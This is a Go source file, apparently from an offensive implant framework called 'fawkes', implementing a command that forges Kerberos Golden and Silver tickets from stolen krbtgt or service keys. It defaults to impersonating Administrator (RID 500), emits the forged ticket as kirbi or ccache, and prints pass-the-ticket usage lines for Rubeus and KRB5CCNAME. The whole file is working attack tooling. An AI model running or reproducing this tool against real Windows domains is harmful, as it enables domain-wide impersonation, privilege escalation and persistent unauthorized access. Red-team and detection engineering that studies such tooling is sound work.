// ticket.go implements the ticket command for Kerberos ticket operations.
// KDC protocol functions are in ticket_kdc.go.
// Serialization (kirbi/ccache) functions are in ticket_serialize.go.
// Request (OPtH) and S4U actions are in ticket_actions.go.

package commands

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/jcmturner/gofork/encoding/asn1"
	"github.com/jcmturner/gokrb5/v8/asn1tools"
	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana/asnAppTag"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

type TicketCommand struct{}

func (c *TicketCommand) Name() string { return "ticket" }
func (c *TicketCommand) Description() string {
	return "Forge Kerberos tickets (Golden/Silver) from extracted keys (T1558.001)"
}

type ticketArgs struct {
	Action      string `json:"action"`      // forge, request, s4u
	Realm       string `json:"realm"`       // domain (e.g., CORP.LOCAL)
	Username    string `json:"username"`    // target identity (e.g., Administrator)
	UserRID     int    `json:"user_rid"`    // RID (default: 500 for Administrator)
	DomainSID   string `json:"domain_sid"`  // domain SID (e.g., S-1-5-21-...)
	Key         string `json:"key"`         // hex AES256 or NT hash key
	KeyType     string `json:"key_type"`    // aes256, aes128, rc4 (default: aes256)
	KVNO        int    `json:"kvno"`        // key version number (default: 2)
	Lifetime    int    `json:"lifetime"`    // ticket lifetime in hours (default: 24)
	Format      string `json:"format"`      // kirbi, ccache (default: kirbi)
	SPN         string `json:"spn"`         // Silver Ticket: service/host, or S4U2Proxy: target SPN
	Server      string `json:"server"`      // KDC address for request/s4u action
	Impersonate string `json:"impersonate"` // S4U: user to impersonate (e.g., Administrator)
}

func (c *TicketCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required. Use -action forge -realm DOMAIN -username user -key <hex_key> -domain_sid <SID>")
	}

	var args ticketArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	switch strings.ToLower(args.Action) {
	case "forge":
		return ticketForge(args)
	case "request":
		return ticketRequest(args)
	case "s4u":
		return ticketS4U(args)
	default:
		return errorf("Unknown action: %s. Use: forge, request, s4u", args.Action)
	}
}

func ticketForge(args ticketArgs) structs.CommandResult {
	defer structs.ZeroString(&args.Key)

	// Validate required args
	if args.Realm == "" || args.Username == "" || args.Key == "" || args.DomainSID == "" {
		return errorResult("Error: realm, username, key, and domain_sid are required for forging")
	}

	// Defaults
	if args.UserRID <= 0 {
		args.UserRID = 500 // Administrator
	}
	if args.Lifetime <= 0 {
		args.Lifetime = 24
	}
	if args.KVNO <= 0 {
		args.KVNO = 2
	}
	if args.Format == "" {
		args.Format = "kirbi"
	}
	if args.KeyType == "" {
		args.KeyType = "aes256"
	}

	realm := strings.ToUpper(args.Realm)

	// Decode the key
	keyBytes, err := hex.DecodeString(args.Key)
	if err != nil {
		return errorf("Error decoding key hex: %v", err)
	}
	defer structs.ZeroBytes(keyBytes)

	// Validate key type and length using shared helper
	etypeID, _, errResult := ticketParseKeyType(args.KeyType, keyBytes)
	if errResult != nil {
		return *errResult
	}

	serviceKey := types.EncryptionKey{
		KeyType:  etypeID,
		KeyValue: keyBytes,
	}

	// Generate random session key (same etype as service key)
	sessionKey, err := ticketGenerateSessionKey(etypeID)
	if err != nil {
		return errorf("Error generating session key: %v", err)
	}
	defer structs.ZeroBytes(sessionKey.KeyValue)

	// Determine service principal
	var sname types.PrincipalName
	isGolden := args.SPN == ""
	if isGolden {
		// Golden Ticket: TGT for krbtgt/REALM
		sname = types.PrincipalName{
			NameType:   nametype.KRB_NT_SRV_INST,
			NameString: []string{"krbtgt", realm},
		}
	} else {
		// Silver Ticket: TGS for specific SPN (e.g., cifs/dc01.corp.local)
		parts := strings.SplitN(args.SPN, "/", 2)
		sname = types.PrincipalName{
			NameType:   nametype.KRB_NT_SRV_INST,
			NameString: parts,
		}
	}

	now := time.Now().UTC()
	endTime := now.Add(time.Duration(args.Lifetime) * time.Hour)
	renewTill := now.Add(7 * 24 * time.Hour)

	// Ticket flags: Forwardable | Proxiable | Renewable | Initial | Pre-authent
	flagBytes := make([]byte, 4)
	flagBytes[0] = 0x50 // Forwardable (bit 1) | Proxiable (bit 3)
	flagBytes[1] = 0xa0 // Renewable (bit 8) | Initial (bit 9)
	// bit 10 = Pre-authent
	flagBytes[1] |= 0x10
	ticketFlags := asn1.BitString{Bytes: flagBytes, BitLength: 32}

	// Create EncTicketPart
	etp := messages.EncTicketPart{
		Flags:  ticketFlags,
		Key:    sessionKey,
		CRealm: realm,
		CName: types.PrincipalName{
			NameType:   nametype.KRB_NT_PRINCIPAL,
			NameString: []string{args.Username},
		},
		Transited: messages.TransitedEncoding{
			TRType:   0,
			Contents: []byte{},
		},
		AuthTime:  now,
		StartTime: now,
		EndTime:   endTime,
		RenewTill: renewTill,
	}

	// Marshal and encrypt
	etpBytes, err := asn1.Marshal(etp)
	if err != nil {
		return errorf("Error marshaling EncTicketPart: %v", err)
	}
	etpBytes = asn1tools.AddASNAppTag(etpBytes, asnAppTag.EncTicketPart)

	encData, err := crypto.GetEncryptedData(etpBytes, serviceKey, keyusage.KDC_REP_TICKET, args.KVNO)
	if err != nil {
		return errorf("Error encrypting ticket: %v", err)
	}

	ticket := messages.Ticket{
		TktVNO:  5, // iana.PVNO
		Realm:   realm,
		SName:   sname,
		EncPart: encData,
	}

	// Generate output
	var output string
	switch strings.ToLower(args.Format) {
	case "kirbi":
		kirbiBytes, err := ticketToKirbi(ticket, sessionKey, args.Username, realm, sname, ticketFlags, now, endTime, renewTill)
		if err != nil {
			return errorf("Error creating kirbi: %v", err)
		}
		output = ticketFormatOutput(args, realm, isGolden, sessionKey, now, endTime, base64.StdEncoding.EncodeToString(kirbiBytes))
	case "ccache":
		ticketBytes, err := ticket.Marshal()
		if err != nil {
			return errorf("Error marshaling ticket: %v", err)
		}
		ccacheBytes := ticketToCCache(ticketBytes, sessionKey, args.Username, realm, sname, ticketFlags, now, endTime, renewTill)
		output = ticketFormatOutput(args, realm, isGolden, sessionKey, now, endTime, base64.StdEncoding.EncodeToString(ccacheBytes))
	default:
		return errorf("Error: unknown format %q. Use: kirbi, ccache", args.Format)
	}

	return successResult(output)
}

func ticketFormatOutput(args ticketArgs, realm string, isGolden bool, sessionKey types.EncryptionKey, start, end time.Time, b64 string) string {
	var sb strings.Builder
	ticketType := "Golden Ticket (TGT)"
	if !isGolden {
		ticketType = fmt.Sprintf("Silver Ticket (TGS: %s)", args.SPN)
	}
	sb.WriteString(fmt.Sprintf("[*] %s forged successfully\n", ticketType))
	sb.WriteString(fmt.Sprintf("    User:      %s@%s (RID: %d)\n", args.Username, realm, args.UserRID))
	sb.WriteString(fmt.Sprintf("    Domain:    %s\n", realm))
	sb.WriteString(fmt.Sprintf("    SID:       %s\n", args.DomainSID))
	sb.WriteString(fmt.Sprintf("    Key Type:  %s (etype %d)\n", args.KeyType, sessionKey.KeyType))
	sb.WriteString(fmt.Sprintf("    Valid:     %s — %s\n", start.Format("2006-01-02 15:04:05 UTC"), end.Format("2006-01-02 15:04:05 UTC")))
	sb.WriteString(fmt.Sprintf("    Format:    %s\n", args.Format))
	sb.WriteString(fmt.Sprintf("    KVNO:      %d\n", args.KVNO))
	sb.WriteString(fmt.Sprintf("\n[+] Base64 %s ticket:\n%s\n", args.Format, b64))

	if args.Format == "kirbi" {
		sb.WriteString("\n[*] Usage: Rubeus.exe ptt /ticket:<base64>\n")
		sb.WriteString("[*] Usage: [IO.File]::WriteAllBytes('ticket.kirbi', [Convert]::FromBase64String('<base64>'))\n")
	} else {
		sb.WriteString("\n[*] Usage: echo '<base64>' | base64 -d > /tmp/krb5cc_forged\n")
		sb.WriteString("[*] Usage: export KRB5CCNAME=/tmp/krb5cc_forged\n")
	}

	return sb.String()
}
